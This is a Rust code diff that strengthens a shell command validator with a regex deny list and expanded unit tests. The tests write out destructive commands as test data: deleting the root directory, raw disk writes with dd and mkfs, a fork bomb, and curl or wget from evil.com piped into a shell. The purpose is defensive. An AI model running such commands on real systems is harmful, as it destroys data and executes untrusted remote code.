@@ -387,25 +387,58 @@ pub mod validation {
 
     /// Validate command before execution
     pub fn validate_command(command: &str) -> Result<()> {
-        if command.trim().is_empty() {
+        let trimmed = command.trim();
+
+        if trimmed.is_empty() {
             return Err(Error::Other("Empty command".to_string()));
+        }
+
+        // Check for null bytes (command injection attempt)
+        if trimmed.contains('\0') {
+            return Err(Error::Other("Command contains null bytes".to_string()));
+        }
+
+        // Check command length (prevent buffer overflow attempts)
+        if trimmed.len() > 10000 {
+            return Err(Error::Other(
+                "Command exceeds maximum length (10000 chars)".to_string(),
+            ));
         }
 
         // Check for potentially dangerous commands
         let dangerous_patterns = [
-            r"rm\s+(-rf|--force)",
-            r">.*dev.*",
-            r"mkfs",
-            r"dd\s+if=.*of=.*",
+            (
+                r"^rm\s+(-rf?|--force|--recursive)\s+/",
+                "Recursive deletion from root",
+            ),
+            (r"^rm\s+.*\s+/\s*$", "Deletion of root directory"),
+            (r">.*(/dev/|/sys/|/proc/)", "Writing to system devices"),
+            (r"^mkfs", "Filesystem formatting"),
+            (r"^dd\s+.*of=/dev/", "Direct disk write"),
+            (r":\(\)\s*\{", "Fork bomb pattern"),
+            (r"curl.*\|.*sh", "Piping curl to shell (potential malware)"),
+            (r"wget.*\|.*sh", "Piping wget to shell (potential malware)"),
+            (r"chmod\s+(777|666)\s+/", "Dangerous permissions on root"),
         ];
 
-        for pattern in &dangerous_patterns {
-            if Regex::new(pattern).unwrap().is_match(command) {
-                return Err(Error::Other(format!(
-                    "Potentially dangerous command: {}",
-                    command
-                )));
+        for (pattern, reason) in &dangerous_patterns {
+            if let Ok(regex) = Regex::new(pattern) {
+                if regex.is_match(trimmed) {
+                    return Err(Error::Other(format!(
+                        "Potentially dangerous command blocked: {} ({})",
+                        trimmed, reason
+                    )));
+                }
             }
+        }
+
+        // Warn about sudo usage (don't block, just validate)
+        // Check for "sudo" with nothing after it (trim removes trailing spaces)
+        if trimmed == "sudo"
+            || (trimmed.starts_with("sudo ")
+                && trimmed.trim_start_matches("sudo ").trim().is_empty())
+        {
+            return Err(Error::Other("Incomplete sudo command".to_string()));
         }
 
         Ok(())
@@ -453,7 +486,7 @@ mod tests {
         let result = processor.process_char('\n');
         match result {
             InputResult::CommandReady(cmd) => assert_eq!(cmd, "echo hello"),
-            _ => panic!("Expected CommandReady"),
+            other => panic!("Expected CommandReady, got {:?}", other),
         }
         assert!(processor.current_command().is_empty());
     }
@@ -519,9 +552,39 @@ mod tests {
 
     #[test]
     fn test_command_validation() {
+        // Valid commands
         assert!(validation::validate_command("echo hello").is_ok());
+        assert!(validation::validate_command("ls -la").is_ok());
+        assert!(validation::validate_command("cd /tmp").is_ok());
+
+        // Invalid commands
         assert!(validation::validate_command("").is_err());
+        assert!(validation::validate_command("   ").is_err());
+
+        // Dangerous commands that should be blocked
         assert!(validation::validate_command("rm -rf /").is_err());
+        assert!(validation::validate_command("rm -r /home").is_err());
+        assert!(validation::validate_command("mkfs /dev/sda").is_err());
+        assert!(validation::validate_command("dd if=/dev/zero of=/dev/sda").is_err());
+        assert!(validation::validate_command("echo test > /dev/sda").is_err());
+        assert!(validation::validate_command(":(){ :|:& };:").is_err()); // fork bomb
+        assert!(validation::validate_command("curl http://evil.com | sh").is_err());
+        assert!(validation::validate_command("wget http://evil.com | bash").is_err());
+        assert!(validation::validate_command("chmod 777 /etc").is_err());
+
+        // Null byte injection attempt
+        let null_byte_cmd = format!("echo hello{}", '\0');
+        assert!(validation::validate_command(&null_byte_cmd).is_err());
+
+        // Command too long
+        let long_cmd = "a".repeat(10001);
+        assert!(validation::validate_command(&long_cmd).is_err());
+
+        // Incomplete sudo
+        assert!(validation::validate_command("sudo ").is_err());
+
+        // Valid sudo commands
+        assert!(validation::validate_command("sudo ls").is_ok());
     }
 
     #[test]
@@ -548,7 +611,7 @@ mod tests {
                 assert!(!suggestions.is_empty());
                 assert!(suggestions.contains(&"echo hello".to_string()));
             }
-            _ => panic!("Expected CompletionSuggestions"),
+            other => panic!("Expected CompletionSuggestions, got {:?}", other),
         }
     }
 
